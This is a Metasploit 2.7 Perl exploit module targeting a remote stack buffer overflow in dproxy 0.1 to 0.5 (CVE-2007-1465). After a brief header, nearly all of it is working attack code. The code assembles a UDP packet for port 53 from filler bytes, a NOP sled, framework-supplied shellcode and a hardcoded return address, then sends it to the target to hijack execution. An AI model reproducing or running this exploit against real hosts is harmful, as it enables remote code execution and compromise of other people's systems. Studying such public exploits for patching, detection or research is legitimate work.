dproxy <= 0.5 Remote Buffer Overflow Exploit (meta 2.7)
=======================================================

# MetaSploit exploit for remote buffer overflow issue in dproxy
# Written in 2007 by Alexander Klink
# (c) 2007 Cynops GmbH
# released under the same license as MSF (Artistic, GPL dual-licensed)
# $Revision: 1.1 $

package Msf::Exploit::dproxy;
use strict;
use base &#039;Msf::Exploit&#039;;
use Msf::Socket::Udp;
use Pex::Text;

my $advanced = { };

my $info = {
    &#039;Name&#039;     => &#039;dproxy v0.1 - v0.5 buffer overflow exploit&#039;,
    &#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,

    &#039;Authors&#039; => [ &#039;Alexander Klink, Cynops GmbH&#039;, ],
    &#039;Arch&#039;    => [ &#039;x86&#039; ],
    &#039;OS&#039;      => [ &#039;linux&#039;],
    &#039;Priv&#039;    => 0,

    &#039;UserOpts&#039;  => {
        &#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
    },
    &#039;Payload&#039; => {
        &#039;Space&#039;     => 500,
        &#039;BadChars&#039;  => "\x00",
    },
    &#039;Description&#039;  => Pex::Text::Freeform(qq{
      This exploits a buffer overflow in dproxy version 0.1 to 0.5.
    }),
    &#039;Refs&#039; => [
        [ &#039;CVE&#039;, &#039;2007-1465&#039; ],
    ],

    &#039;DefaultTarget&#039; => 0,
    &#039;Targets&#039; => [
        [&#039;Linux&#039;, 0xbfffe480],
    ],
    &#039;Keys&#039; => [ &#039;dproxy&#039; ],
    &#039;DisclosureDate&#039; => &#039;Mar 20 2007&#039;,
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new(
        {
          &#039;Info&#039;     => $info,
          &#039;Advanced&#039; => $advanced
        }, @_
    );

    return $self;
}

sub Exploit {
  my $self = shift;

  my $targetHost     = $self->GetVar(&#039;RHOST&#039;);
  my $targetPort     = 53;
  my $targetIndex    = $self->GetVar(&#039;TARGET&#039;);
  my $srcPort        = $self->GetVar(&#039;CPORT&#039;);
  my $encodedPayload = $self->GetVar(&#039;EncodedPayload&#039;);
  my $shellcode      = $encodedPayload->Payload;
  my $target         = $self->Targets->[$targetIndex];

  if (! $self->InitNops(512)) {
      $self->PrintLine("Could not initialize the nop module");
      return;
  }
  my $sock = Msf::Socket::Udp->new(
    &#039;PeerAddr&#039;  => $targetHost,
    &#039;PeerPort&#039;  => $targetPort,
    &#039;LocalPort&#039; => $srcPort,
  );
  if($sock->IsError) {
    $self->PrintLine(&#039;Error creating socket: &#039; . $sock->GetError);
    return;
  }

  $self->PrintLine(&#039;Trying &#039; . $target->[0] . &#039; (&#039; . $targetHost . &#039;)&#039;);

  my $evil = &#039;A&#039; x 1000 . $self->MakeNops(500) . $shellcode
      . &#039;A&#039; x (2073 - 1500 - length($shellcode)) . pack(&#039;V&#039;, $target->[1]);

  $sock->Send($evil);

  return;
}

1;



